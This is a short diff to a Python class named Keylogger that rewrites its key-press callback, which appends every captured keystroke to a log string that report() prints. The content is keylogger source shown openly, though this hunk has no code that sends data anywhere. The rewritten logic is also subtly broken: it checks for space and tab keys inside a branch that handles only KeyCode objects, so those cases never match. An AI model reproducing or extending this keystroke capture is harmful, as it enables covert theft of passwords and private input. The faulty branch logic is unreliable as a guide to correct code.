@@ -51,15 +51,20 @@ class Keylogger:
     def __init__(self):
         self.log = "Keylogger Started"
 
-    def process_key_press(self, key: Optional[Key | KeyCode]):  # call back function
-        try:
-            current_key = str(key.char)
-        except AttributeError:
+    def process_key_press(self, key: Optional[Key | KeyCode]):
+        if key is None:
+            return
+        if isinstance(key, KeyCode):
             if key == Key.space:
-                current_key = " "
+                self.log += " "
+            elif key == Key.tab:
+                self.log += "\t"
+            elif key.char is not None:
+                self.log += key.char
             else:
-                current_key = " " + str(key) + " "
-        self.log += current_key
+                self.log += f"[{key}]"
+        else:
+            self.log += f"[{key}]"
 
     def report(self):
         print(self.log)
